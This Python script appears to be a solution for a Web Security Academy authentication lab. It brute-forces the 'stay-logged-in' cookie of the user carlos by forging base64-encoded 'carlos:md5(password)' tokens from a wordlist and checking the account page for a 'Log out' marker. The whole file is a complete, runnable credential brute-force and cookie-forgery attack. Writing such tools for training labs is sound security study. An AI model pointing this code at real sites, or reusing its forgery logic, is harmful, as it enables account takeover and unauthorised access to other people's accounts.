from __future__ import annotations

import argparse
import base64
import hashlib
import sys
from pathlib import Path
from typing import Iterable
from urllib.parse import urljoin

from requests import RequestException

from src.common.cli_utils import build_cli_client
from src.common.http_utils import HttpClient

PASSWORDS_FILE = Path(__file__).with_name("lab09-passwords.txt")
DEFAULT_ENDPOINT = "/my-account"
SUCCESS_MARKER = "Log out"


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Authentication Lab09: brute-force the stay-logged-in cookie for carlos."
    )
    _ = parser.add_argument(
        "url",
        help="Base URL, e.g. https://target.web-security-academy.net",
    )
    _ = parser.add_argument(
        "--endpoint",
        default=DEFAULT_ENDPOINT,
        help="Account endpoint path (default: %(default)s)",
    )
    _ = parser.add_argument(
        "--passwords",
        type=Path,
        default=PASSWORDS_FILE,
        help="Path to password wordlist (default: %(default)s)",
    )
    _ = parser.add_argument(
        "--proxy",
        default=None,
        help="Proxy URL ('' to disable)",
    )
    _ = parser.add_argument(
        "--insecure",
        action="store_true",
        help="Disable TLS verification",
    )
    _ = parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="HTTP timeout in seconds (default: %(default)s)",
    )

    return parser.parse_args(argv)


def _load_passwords(passwords_path: Path) -> list[str]:
    return passwords_path.read_text(encoding="utf-8").splitlines()


def _stay_logged_in_cookie(password: str) -> str:
    digest = hashlib.md5(password.encode("utf-8")).hexdigest()
    token = f"carlos:{digest}"
    return base64.b64encode(token.encode("utf-8")).decode("utf-8")


def brute_force_carlos(
    client: HttpClient,
    *,
    endpoint: str,
    passwords: Iterable[str],
    success_marker: str = SUCCESS_MARKER,
) -> str | None:
    url = urljoin(client.base_url + "/", endpoint.lstrip("/"))
    session = client.session

    for password in passwords:
        candidate = password.strip()
        if not candidate:
            continue

        stay_logged_in = _stay_logged_in_cookie(candidate)
        try:
            response = session.get(
                url,
                cookies={"stay-logged-in": stay_logged_in},
                timeout=client.timeout,
                verify=client.verify_tls,
            )
        except RequestException as exc:
            raise RuntimeError(f"Request failed for password '{candidate}': {exc}") from exc

        if success_marker in response.text:
            return candidate

    return None


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    try:
        password_path = args.passwords.expanduser()
        passwords = _load_passwords(password_path)
    except FileNotFoundError as exc:
        print(f"[-] Password file not found: {exc.filename}")
        return 2

    print("[*] Brute-forcing Carlos's stay-logged-in cookie...")

    try:
        found = brute_force_carlos(
            client,
            endpoint=args.endpoint,
            passwords=passwords,
        )
    except RuntimeError as exc:
        print(f"[-] Request failed: {exc}")
        return 2

    if found:
        print(f"[+] Found Carlos's password: {found}")
        return 0

    print("[-] Could not find Carlos's password.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
